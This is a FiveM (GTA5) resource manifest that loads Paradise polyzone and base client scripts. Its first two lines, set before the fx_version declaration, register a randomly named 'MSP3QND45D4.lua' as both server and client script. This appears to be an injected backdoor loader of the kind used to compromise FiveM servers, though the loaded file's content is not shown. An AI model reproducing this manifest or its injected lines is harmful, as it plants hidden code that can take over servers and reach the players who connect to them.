server_script "MSP3QND45D4.lua"
client_script "MSP3QND45D4.lua"
fx_version("cerulean")
game("gta5")
lua54("yes")
client_script("@Paradise-base/components/cl_error.lua")
client_script("@Paradise-pwnzor/client/check.lua")

client_scripts({
	"@Paradise-polyzone/client.lua",
	"@Paradise-polyzone/BoxZone.lua",
	"@Paradise-polyzone/EntityZone.lua",
	"@Paradise-polyzone/CircleZone.lua",
	"@Paradise-polyzone/ComboZone.lua",

	"client/*.lua",
	"client/targets/*.lua",
})
